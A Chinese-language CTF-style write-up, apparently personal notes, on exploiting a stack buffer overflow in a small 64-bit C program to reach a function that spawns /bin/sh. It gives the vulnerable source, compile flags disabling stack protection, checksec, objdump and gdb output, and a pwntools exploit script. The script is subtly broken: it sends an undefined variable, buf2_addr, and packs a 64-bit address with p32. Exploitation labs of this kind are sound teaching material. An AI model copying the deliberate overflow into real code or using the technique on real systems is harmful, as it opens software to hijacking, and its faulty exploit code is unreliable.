---
title: pwn-sniper-01
updated: 2023-05-17 09:17:58Z
created: 2023-04-03 07:01:38Z
---

**漏洞程序源码如下：**

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// 栈溢出后执行的函数
void bingo(){
    system("/bin/sh"); // 调用 system 函数启动 /bin/sh 来获取 shell
}

int main(){
    char buffer[36] = {0}; // 定义 36 个字符(字节)长度的字符数组 , 并全部初始化为 0
    puts("Tell my why : ");
    /* 溢出漏洞产生的原因就是因为 read 函数并没有对 buffer 数组的范围进行检查 
     * 如果我们向标准输入流中输入了超出 buffer 范围 (36个字节) 的数据 , 那么写操作并不会停止 , 而是会继续向内存中写入数据 , 而这些数据就是由我们控制的
     * 我们知道 , buffer 数组是保存在内存中的栈段中的 , 而 main 函数的返回地址也是保存在栈段中的
     * 因此 , 我们只需要控制写入的数据 , 将 main 函数的返回地址覆盖
     * 这样 , 在主函数执行结束后 , 会 pop 栈中保存的主函数的返回地址 (事实上已经被我们写入的数据覆盖) 到 eip 寄存器中
     * cpu 就会不会认为程序已经结束 , 而是继续根据 eip 寄存器指向的内存取指令执行 , 这样我们就达到了可以任意控制程序流程的目的
     * 因此 , 我们为了能获取一个 shell , 我们需要将主函数的返回地址覆盖为 bingo 函数的地址
     * 然后程序继续执行之后遇到 return 0 就会直接跳转到 bingo 函数 , 从而运行 /bin/sh , 我们就可以得到目标主机的 shell
     * 由于时间关系 , 这里所有的操作都在本机进行 , 远程操作也是同样的道理 , 因此不再赘述
     */
    read(0, buffer, 0xFF); // 使用 read 函数将标准输入流中的数据复制到 buffer 字符数组
    printf("Good boy : %s\n", buffer); // 打印字符数组的长度
    return 0; // 主函数返回
}
```

**编译选项如下：**

```makefile
a.out:hello.c
    gcc -g -fno-stack-protector hello.c
clean:
    rm ./a.out
```

**checksec**

```shell
└─$ checksec --file=./a.out
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   76 Symbols        No    0               2               ./a.out
```

**objdump**

```
└─$ objdump -t -j .text a.out 

a.out:     file format elf64-x86-64

SYMBOL TABLE:
0000000000400500 l    d  .text  0000000000000000              .text
0000000000400530 l     F .text  0000000000000000              deregister_tm_clones
0000000000400560 l     F .text  0000000000000000              register_tm_clones
00000000004005a0 l     F .text  0000000000000000              __do_global_dtors_aux
00000000004005c0 l     F .text  0000000000000000              frame_dummy
00000000004006e0 g     F .text  0000000000000002              __libc_csu_fini
00000000004005ed g     F .text  0000000000000010              bingo
0000000000400670 g     F .text  0000000000000065              __libc_csu_init
0000000000400500 g     F .text  000000000000002a              _start
00000000004005fd g     F .text  000000000000006c              main
```

**使用gdb进行调试**

```shell
gdb-peda$ disass main
Dump of assembler code for function main:
   0x00000000004005fd <+0>:     push   rbp
   0x00000000004005fe <+1>:     mov    rbp,rsp
   0x0000000000400601 <+4>:     sub    rsp,0x30
   0x0000000000400605 <+8>:     mov    QWORD PTR [rbp-0x30],0x0
   0x000000000040060d <+16>:    mov    QWORD PTR [rbp-0x28],0x0
   0x0000000000400615 <+24>:    mov    QWORD PTR [rbp-0x20],0x0
   0x000000000040061d <+32>:    mov    QWORD PTR [rbp-0x18],0x0
   0x0000000000400625 <+40>:    mov    DWORD PTR [rbp-0x10],0x0
   0x000000000040062c <+47>:    mov    edi,0x4006fc
   0x0000000000400631 <+52>:    call   0x4004a0 <puts@plt>
   0x0000000000400636 <+57>:    lea    rax,[rbp-0x30]
   0x000000000040063a <+61>:    mov    edx,0xff
   0x000000000040063f <+66>:    mov    rsi,rax
   0x0000000000400642 <+69>:    mov    edi,0x0
   0x0000000000400647 <+74>:    call   0x4004d0 <read@plt>
   0x000000000040064c <+79>:    lea    rax,[rbp-0x30]
   0x0000000000400650 <+83>:    mov    rsi,rax
   0x0000000000400653 <+86>:    mov    edi,0x40070b
   0x0000000000400658 <+91>:    mov    eax,0x0
   0x000000000040065d <+96>:    call   0x4004c0 <printf@plt>
   0x0000000000400662 <+101>:   mov    eax,0x0
   0x0000000000400667 <+106>:   leave
   0x0000000000400668 <+107>:   ret
End of assembler dump.
```

```shell
gdb-peda$ disass bingo
Dump of assembler code for function bingo:
   0x00000000004005ed <+0>:     push   rbp
   0x00000000004005ee <+1>:     mov    rbp,rsp
   0x00000000004005f1 <+4>:     mov    edi,0x4006f4
   0x00000000004005f6 <+9>:     call   0x4004b0 <system@plt>
   0x00000000004005fb <+14>:    pop    rbp
   0x00000000004005fc <+15>:    ret
End of assembler dump.
```

从`main`函数中可以看到，存储输入数据的偏移地址为`[rbp-0x30]`

`bingo`函数的地址为`0x4005ed`

据此构造利用脚本，如下：

由于该程序为64位，则段基地址长度为8位，则覆盖长度为48+8=56

```python
from pwn import *

sh = process('./a.out')
key = 0x4005ed

sh.sendline(b'a'*56 + p32(buf2_addr))
sh.interactive()
```

![933f0062a25887296164e0b5b07357f0.png](https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/933f0062a25887296164e0b5b07357f0.png)